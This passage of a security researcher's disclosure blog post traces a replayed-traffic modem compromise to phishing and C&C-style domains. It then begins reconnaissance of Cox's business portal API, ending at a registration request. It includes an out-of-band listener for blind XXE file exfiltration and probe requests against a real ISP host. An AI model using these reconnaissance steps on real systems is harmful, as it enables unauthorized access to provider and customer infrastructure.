<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/ec1a1eae803b668e-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/f980ec13b5b5e554.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/6352103c9de7dc6b.css" crossorigin="" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/2f94dd838c46567f.css" crossorigin="" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-c41ac42b99ebfa5c.js" crossorigin=""/><script src="/_next/static/chunks/817ad8d0-c3a26327e5ca6fbf.js" async="" crossorigin=""></script><script src="/_next/static/chunks/89-ea998b867c36929b.js" async="" crossorigin=""></script><script src="/_next/static/chunks/main-app-ea1d9801e0c619a9.js" async="" crossorigin=""></script><script src="/_next/static/chunks/303-8cee44aa9b5efa51.js" async=""></script><script src="/_next/static/chunks/app/%5Bslug%5D/page-af402571294e470f.js" async=""></script><title>Hacking Millions of Modems (and Investigating Who Hacked My Modem)</title><meta name="description" content="A technical blog"/><meta property="og:title" content="Hacking Millions of Modems (and Investigating Who Hacked My Modem)"/><meta property="og:description" content="Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server."/><meta property="og:site_name" content="samcurry.net"/><meta property="og:image" content="https://samcurry-11fcyf1zb-sam-currys-projects.vercel.app/images/hacking-millions-of-modems/cover.png"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Hacking Millions of Modems (and Investigating Who Hacked My Modem)"/><meta name="twitter:description" content="Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server."/><meta name="twitter:image" content="https://samcurry-11fcyf1zb-sam-currys-projects.vercel.app/images/hacking-millions-of-modems/cover.png"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="32x32"/><meta name="next-size-adjust"/><script defer="" data-domain="samcurry.net" src="https://plausible.io/js/script.js"></script><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" crossorigin="" noModule=""></script></head><body class="__className_ac79ff subpixel-antialiased py-12 px-4 flex flex-row justify-center dark:[color-scheme:dark]"><div class="__className_ac79ff w-full h-full flex justify-center dark:[color-scheme:dark]"><div class="space-y-4 max-w-full md:max-w-3xl"><aside class="fixed transform -translate-x-72 opacity-0 xl:block xl:opacity-100 transition-opacity"><nav class="flex flex-col gap-8"><a href="/" class="text-sm">‹ Back</a><nav class="max-w-[260px] text-sm h-screen overflow-y-auto"><ul class="flex flex-col gap-2"><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Introduction</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Who are you, 159.65.76.209?</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Hackers Hacking Hackers?</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Handing Over Evidence</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Three Years Later</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Targeting REST APIs using the TR-069 Protocol</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Hacking Millions of Modems</span></li><li class="pl-3 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>HTTP request that does not start with api/cbma (returns 301):</span></li><li class="pl-3 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>HTTP request that does start with api/cbma (returns 500):</span></li><li class="pl-3 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Loading Static Resources from Reverse Proxy API</span></li><li class="pl-3 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Accidentally Discovering an Authorization Bypass on the Cox Backend API</span></li><li class="pl-3 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Confirming We Can Access Anyone&#x27;s Equipment</span></li><li class="pl-3 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Accessing and Updating any Cox Business Customer Account</span></li><li class="pl-3 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Overwriting Anyone&#x27;s Device Settings via Leaked Cryptographic Secret</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Executing Commands on Any Modem</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Impact</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Addendum</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Timeline</span></li><li class="pl-0 cursor-pointer font-light transition-colors text-zinc-600 hover:text-black dark:text-zinc-400 dark:hover:text-white"><span>Thanks</span></li></ul></nav></nav></aside><main class="prose max-w-none prose-blue prose-img:rounded-md prose-img:w-full dark:prose-invert text-lg break-words"><div><a href="/" class="opacity-100 xl:opacity-0 transition-opacity text-sm my-2 text-neutral-700 dark:text-zinc-400 dark:hover:text-neutral-300">‹ Back</a><h1 class="text-3xl my-0">Hacking Millions of Modems (and Investigating Who Hacked My Modem)</h1><small><time dateTime="2024-06-03T00:00:00.000Z">Mon Jun 03 2024</time></small></div><img alt="Hacking Millions of Modems (and Investigating Who Hacked My Modem)" loading="lazy" width="500" height="500" decoding="async" data-nimg="1" style="color:transparent" src="/images/hacking-millions-of-modems/cover.png"/><div class="pt-4"><h1 id="introduction">Introduction</h1>
<p>Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server:</p>
<pre><code class="__className_8a4d12">python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre>
<p>Once the webserver was running, I sent a cURL request from my home computer to make sure that it could receive external HTTP requests:</p>
<pre><code class="__className_8a4d12">curl &quot;http://54.156.88.125:8000/test123&quot;
</code></pre>
<p>Just a few seconds later, I saw the following log:</p>
<pre><code class="__className_8a4d12">98.161.24.100 - [16:32:12] &quot;GET /test123 HTTP/1.1&quot;
</code></pre>
<p>Perfect, this meant that I was able to receive network traffic on the box. Everything seemed good to go, but right as I switched back to exploiting the vulnerability, something very unexpected appeared in my log file:</p>
<pre><code class="__className_8a4d12">98.161.24.100 - [16:32:12] &quot;GET /test123 HTTP/1.1&quot;
159.65.76.209 - [16:32:22] &quot;GET /test123 HTTP/1.1&quot;
</code></pre>
<p>An unknown IP address had replayed the exact same HTTP request just 10 seconds later.</p>
<p>&quot;Wow, that’s seriously weird,&quot; I thought. Somewhere, between my home network and the AWS box, someone had intercepted and replayed my HTTP traffic. This traffic should not be accessible. There is no intermediary between these two systems who should be seeing this. My immediate thought was that my computer had been hacked and that the hacker was actively monitoring my traffic.</p>
<p>To check if the same behavior occured on a different device, I pulled out my iPhone and typed in the URL into Safari. I sent the request, then peaked at my log file:</p>
<pre><code class="__className_8a4d12">98.161.24.100 - [16:34:04] &quot;GET /uhhhh HTTP/1.1&quot;
159.65.76.209 - [16:34:16] &quot;GET /uhhhh HTTP/1.1&quot;
</code></pre>
<p>The same unknown IP address had intercepted and replayed both HTTP requests from my computer and iPhone. Somehow, someone was intercepting and replaying the web traffic from likely every single device on my home network.</p>
<p>Panicked, I spun up a new AWS box running Nginx to make sure that the original instance hadn&#x27;t been compromised somehow.</p>
<pre><code class="__className_8a4d12">sudo service nginx start
tail -f /var/log/nginx/access.log
</code></pre>
<p>I opened the URL once again from my iPhone and saw the exact same logs:</p>
<pre><code class="__className_8a4d12">98.161.24.100 - [16:44:04] &quot;GET /whatisgoingon1234 HTTP/1.1&quot;
159.65.76.209 - [16:44:12] &quot;GET /whatisgoingon1234 HTTP/1.1&quot;
</code></pre>
<p>Through what could only be my ISP, modem, or AWS being compromised, someone was intercepting and replaying my HTTP traffic immediately after I&#x27;d sent it. To eliminate the absurd idea that AWS had been compromised, I spun up a box on GCP instead and observed the same unknown IP address replaying my HTTP requests. It wasn’t AWS.</p>
<p>The only real option left was that my modem had been hacked, but who was the attacker? I queried the owner of the IP address and found that it belonged to DigitalOcean. Strange. That definitely didn&#x27;t belong to my ISP.</p>
<h2 id="who-are-you-1596576209">Who are you, 159.65.76.209?</h2>
<p>To kick off an investigation, I sent the IP address to some friends who worked for threat intelligence companies. They sent me a link to the VirusTotal listing for the IP address which detailed all of the domains which resolved to the IP address over the past few years.</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>Out of the last 5 domains that were tied to the IP address, 3 were phishing websites, and 2 were what appeared to be mail servers. The following domains all at one point in time resolved to the DigitalOcean IP address:</p>
<pre><code class="__className_8a4d12">regional.adidas.com.py (2019/11/26)
isglatam.online (2019/12/08)
isglatam.tk (2020/11/11)
mx12.limit742921.tokyo (2021/08/08)
mx12.jingoism44769.xyz (2022/04/12)
</code></pre>
<p>Two of the domains associated with the 159.65.76.209 IP address were <code class="__className_8a4d12">isglatam.online</code> and <code class="__className_8a4d12">isglatam.tk</code>. These were both at one point in time phishing websites for <code class="__className_8a4d12">isglatam.com</code>, a South American cybersecurity company.</p>
<p>After visiting the real ISG Latam website, we learned that they are based out of Paraguay and partnered with Crowdstrike, AppGate, Acunetix, DarkTrace, and ForcePoint. From a 10 minute read of everything, it appeared that the people who were intercepting my traffic had tried to phish ISG Latam using the same IP address.</p>
<h2 id="hackers-hacking-hackers">Hackers Hacking Hackers?</h2>
<p>Now this was odd. The IP address, just one year prior, was being used to host phishing infrastructure that targeted a South American cybersecurity company. Assuming that they have been in control of this IP address for 3 years, it would mean that they have used it for at least 2 different phishing campaigns and what appeared to be a C&amp;C server for router malware?</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>Through URLscan, I learned that the <code class="__className_8a4d12">isglatam.online</code> and <code class="__className_8a4d12">isglatam.tk</code> websites were hosting generic BeEF phishing sites that can historically be seen <a href="https://urlscan.io/result/52459337-0f2d-4b26-859f-4a6f4eafa6dd#transactions" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">here</a>.</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>The signature of the attacker was super interesting, because they were doing a lot of different malicious activities from the same box and apparently had not gotten suspended in over 3 years. It was really hard to piece together their intent with the Adidas, ISG Latam, and modem hacking thing all coming from the same IP address. There was a chance that the IP had rotated between different owners over the years, but it didn&#x27;t seem likely as the gaps in between everything were long and it was unlikely that it was immediately reassigned to another malicious party.</p>
<p>Realizing that the infected device was still running, I walked over, unplugged it, and placed it into a cardboard box.</p>
<h2 id="handing-over-evidence">Handing Over Evidence</h2>
<p>The modem that I had been using was the Cox Panoramic Wifi gateway. After learning that it was likely compromised, I went to the local Cox store to show them my device and ask for a new one.</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>The one issue with this request was that in order for me to receive a new modem, I had to hand over the old one. Sadly, it wasn&#x27;t actually my property — I was only <em>renting</em> it from the ISP. I explained to the employee how I wanted to keep and reverse engineer the device. Their eyes shot up a little bit. They were much less enthusiastic about giving it back to me.</p>
<p>“There’s no way I can keep it?” I asked. “No, we need to take your old one to give you a new one,” the ISP representative said. There was no budging. As much as I wanted to take it apart, dump the firmware, and see if there was any trace of whatever potentially compromised it, I had already passed the device off to the employee. I took my new device and left the store, disappointed that I wasn’t able to do anything more with it.</p>
<p>After setting up the new modem, the previous behavior completely stopped. My traffic was no longer being replayed. There was no &quot;other IP&quot; in the logs. Everything seemed fixed.</p>
<p>With a bit of dissapointment I concluded that the modem I no longer had access to was what had been compromised. Since I’d handed it over to the ISP and replaced the device, there wasn’t anything more that I could investigate besides maybe seeing if my computer had gotten hacked.</p>
<p>I gave up trying to figure it out. At least for the time being.</p>
<h2 id="three-years-later">Three Years Later</h2>
<p>In early 2024, almost three years later, I was on vacation with some friends who also worked in cybersecurity. We were having a conversation over dinner when I explained the story to them. Curious to learn more, they asked me for all of the details and thought it’d be fun to run their own investigation.</p>
<p>The first thing that caught their attention (having worked on more malware analysis a lot more than I had) was the format of the two mail server domains (<code class="__className_8a4d12">limit742921.tokyo</code> and <code class="__className_8a4d12">jingoism44769.xyz</code>). They pulled the IP address of the <code class="__className_8a4d12">mx1</code> subdomain for <code class="__className_8a4d12">limit742921.tokyo</code> and then ran a reverse IP search on all domains that had at one point in time pointed to that same IP address. There were over 1,000 domains that all followed the exact same pattern...</p>
<pre><code class="__className_8a4d12"><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;rrname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;acquire543225.biz.&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;rrtype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;A&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;rdata&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;153.127.55.212&quot;</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;rrname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;battery935904.biz.&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;rrtype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;A&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;rdata&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;153.127.55.212&quot;</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;rrname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;grocery634272.biz.&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;rrtype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;A&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;rdata&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;153.127.55.212&quot;</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;rrname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;seventy688181.biz.&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;rrtype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;A&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;rdata&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;153.127.55.212&quot;</span><span class="hljs-punctuation">}</span>
</code></pre>
<p>Every single domain that was registered by the discovered IP address used the same naming convention:</p>
<pre><code class="__className_8a4d12">[word][6 numbers].[TLD]
</code></pre>
<p>Due to the mass-number of domains and algorithmic structure of the registered address, this appeared to be a domain generation algorithm used by malware operators to rotate the resolving address for the C&amp;C server for the purpose of obfuscation. There was a good chance that the IP address replaying my traffic was a C&amp;C server, and the two domains which I thought were mail servers were actually algorithmically generated pointers to the C&amp;C server.</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>Something disappointing was that all of these domains were historical; the last one seen was registered on March 17, 2023. None of the hosts resolved to anything anymore, and we couldn’t seem to identify anything similar being registered to the same IP address.</p>
<p>Given that my new modem was the same model that had been compromised, I was curious if the attacker had found a way back in. From a quick Google search I’d learned that there were no public vulnerabilities for the model of modem that I had (even though it was now 3 years later) so if there was an exploit, they were doing a great job keeping it private.</p>
<p>The other option that seemed more-and-more likely was that they had exploited something outside of a generic router exploit. I was super curious to investigate this and try to brainstorm ways that my device could’ve been compromised.</p>
<h2 id="targeting-rest-apis-using-the-tr-069-protocol">Targeting REST APIs using the TR-069 Protocol</h2>
<p>After getting back home, a close friend had asked if I’d be able to help him move furniture into his new house. What this also meant was helping him transfer over his Cox modem. After connecting his device to the fiber line, I went ahead and called the ISP support and asked if they’d be able to push out an update to allow the device to work in the new location. The agent confirmed they could remotely update the device settings, including changing the WiFi password and viewing connected devices.</p>
<p>The ability of support agents to control devices really interested me, especially since they could update pretty much anything on the device. This extensive access was facilitated by a protocol known as TR-069, implemented in 2004, which allowed ISPs to manage devices within their own network via port 7547. This protocol had already been the subject of a few great DEF CON talks and wasn’t externally exposed, so I wasn’t super interested in bug hunting the protocol itself. What I was interested in, however, were the tools that the support agent was using to manage the device.</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>To theorycraft a little bit, if I were a hacker who wanted to compromise my modem I&#x27;d likely target whatever infrastructure powered the support tools that the agents were using. There was probably some internal website for device management that support agents used, backed by an API that could execute arbitrary commands and change/view administrative settings of customer devices. If I could find some way to access this functionality, it might shed light on how I might have been originally hacked and patch out at least one method for someone to compromise my modem.</p>
<h1 id="hacking-millions-of-modems">Hacking Millions of Modems</h1>
<p>The first thing that I decided to look at was the Cox Business portal. This app had a ton of interesting functionality to remotely manage devices, set firewall rules, and monitor network traffic.</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>Without actually having a Cox business account myself, I opened the login page for the portal and grabbed a copy of the <code class="__className_8a4d12">main.36624ed36fb0ff5b.js</code> file that powered the core functionality of the app. After beautifying it, I parsed out all of the routes and scrolled through them:</p>
<pre><code class="__className_8a4d12">/api/cbma/voicemail/services/voicemail/inbox/transcribeMessage/
/api/cbma/profile/services/profile/userroles/
/api/cbma/accountequipment/services/accountequipment/equipments/eligibleRebootDevice
/api/cbma/accountequipment/services/accountequipment/casedetail
/api/cbma/user/identity/services/useridentity/user/verifyContact
/api/cbma/user/identity/services/useridentity/user/contact/validate
...
</code></pre>
<p>There were over 100 different API calls that all had the same base path of <code class="__className_8a4d12">/api/cbma/</code>. Since this route seemed to be power most device-related functionality, I thought it was worth investigating if the <code class="__className_8a4d12">/api/cbma/</code> endpoint happened to be a reverse proxy to another host. I tested this by sending the following requests:</p>
<h3 id="http-request-that-does-not-start-with-apicbma-returns-301">HTTP request that does not start with api/cbma (returns 301):</h3>
<pre><code class="__className_8a4d12"><span class="hljs-string">GET</span> <span class="hljs-string">/api/anything_else/example</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">301</span> <span class="hljs-string">Moved</span> <span class="hljs-string">Permanently</span>
<span class="hljs-attr">Location:</span> <span class="hljs-string">https://myaccount-business.cox.com/cbma/api/anything_else/example</span>
</code></pre>
<h3 id="http-request-that-does-start-with-apicbma-returns-500">HTTP request that does start with api/cbma (returns 500):</h3>
<pre><code class="__className_8a4d12"><span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/example</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">500</span> <span class="hljs-string">Internal</span> <span class="hljs-string">Server</span> <span class="hljs-string">Error</span>
<span class="hljs-attr">Server:</span> <span class="hljs-string">nginx</span>
</code></pre>
<p>From sending the above HTTP requests, we learn that the <code class="__className_8a4d12">api/cbma</code> endpoint is an explicit route that is likely a reverse proxy to another host due to the differing behavior around the HTTP response. When we request anything besides <code class="__className_8a4d12">api/cbma</code>, it responds with a 302 redirect instead of the 500 internal server error triggered from <code class="__className_8a4d12">api/cbma</code>.</p>
<p>This indicated that they were proxying API requests to a dedicated backend while serving the frontend files from the normal system.</p>
<p>Since the API itself had all of the interesting device management functionality, it made sense to focus on everything behind the <code class="__className_8a4d12">api/cbma</code> route and see if there was any low hanging fruit like exposed actuators, API documentation, or any directory traversal vulnerabilities that would allow us to escalate permissions.</p>
<p>I went ahead and proxied the registration request for the Cox Business portal which was underneath the <code class="__className_8a4d12">api/cbma</code> path:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">POST</span> <span class="hljs-string">/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
